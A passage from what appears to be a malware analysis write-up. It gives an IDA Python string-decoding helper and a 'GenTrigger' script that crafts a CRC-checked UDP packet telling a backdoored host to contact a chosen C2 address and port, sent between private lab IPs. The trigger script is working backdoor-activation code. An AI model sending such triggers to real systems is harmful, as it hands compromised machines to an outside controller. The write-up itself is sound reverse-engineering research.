    tmp=bytearray()
    
    buf=ida_bytes.get_bytes(addr,len)
    for i in buf:
        tmp.append(~i&0xff)

    print("%x, %s" %(addr,bytes(tmp)))
    ida_bytes.put_bytes(addr,bytes(tmp))
    idc.create_strlit(addr,addr+len)
    
calllist=idautils.CodeRefsTo(0x0804F1D8,1)
for addr in calllist:
    prev1Head=idc.prev_head(addr)
    if 'push    offset' in idc.generate_disasm_line(prev1Head,1) and idc.get_operand_type(prev1Head,0)==5:
        bufaddr=idc.get_operand_value(prev1Head,0)
        prev2Head=idc.prev_head(prev1Head)
        
        if 'push' in idc.generate_disasm_line(prev2Head,1) and idc.get_operand_type(prev2Head,0)==5:
            leng=idc.get_operand_value(prev2Head,0)
            decode(bufaddr,leng)


```

0x02 GenTrigger
---------------

```
import random
import socket


def crc16(data: bytearray, offset, length):
  if data is None or offset < 0 or offset > len(data) - 1 and offset + length > len(data):
    return 0
  crc = 0xFFFF
  for i in range(0, length):
    crc ^= data[offset + i] << 8
    for j in range(0, 8):
      if (crc & 0x8000) > 0:
        crc = (crc << 1) ^ 0x1021
      else:
        crc = crc << 1
  return crc & 0xFFFF

def Gen_payload(ip:str,port:int):
    out=bytearray()
    part1=random.randbytes(92)
    sum=crc16(part1,8,84)
  
    offset1=sum % 0xc8
    offset2=sum % 0x37
    padding1=random.randbytes(offset1)
    padding2=random.randbytes(8)
    
    
    host=socket.inet_aton(ip)
    C2=bytearray(b'\x01')
    C2+=host
    C2+=int.to_bytes(port,2,byteorder="big")
    key=b'NetlabPatched,Enjoy!'
    C2 = C2+key +b'\x00\x00'
    c2sum=crc16(C2,0,29)
    C2=C2[:-2]
    C2+=(int.to_bytes(c2sum,2,byteorder="big"))

    flag=0x7f*10
    out+=part1
    out+=padding1
    out+=(int.to_bytes(sum,2,byteorder="big"))
    out+=(int.to_bytes(flag,2,byteorder="big"))
    out+=padding2

    tmp=bytearray()
    for i in range(29):
      tmp.append(C2[i] ^ out[offset2+8+i])
    out+=tmp

    leng=472-len(out)
    lengpadding=random.randbytes(random.randint(0,leng+1))
    out+=lengpadding

    return out
    
payload=Gen_payload('192.168.159.128',6666)
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
sock.sendto(payload,("192.168.159.133",2345))  # 任意端口


```